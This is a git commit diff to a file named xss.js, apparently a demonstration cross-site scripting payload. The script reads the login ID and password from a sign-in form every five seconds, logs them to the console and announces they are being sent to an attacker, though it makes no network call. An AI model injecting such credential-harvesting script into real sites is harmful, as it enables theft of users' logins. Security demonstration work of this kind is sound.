9ee507ef8b550105def7ff85df382f5ead14b8a7
anna grad <92148657+annagrad@users.noreply.github.com>
2025-06-23 15:54:25 +0630

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,1 @@
-console.log("XSS Attack was successful"),$(function(){setInterval(function(){let n=$("#o-form-sign-in input[name=login_id]").val(),i=$("#o-form-sign-in input[name=password]").val();console.log("login_id",n,"password",i),n&&i&&console.warning(`(づ｡◕‿‿◕｡)づ Sending username**(${n}) and password**(${i}) to Attacker...`)},5e3)});
-
-
+console.log("XSS Attack was successful"),$(function(){setInterval(function(){let n=$("#o-form-sign-in input[name=login_id]").val(),o=$("#o-form-sign-in input[name=password]").val();console.log("login_id",n,"password",o),n&&o&&console.warn(`(づ｡◕‿‿◕｡)づ Sending username**(${n}) and password**(${o}) to Attacker...`)},5e3)});
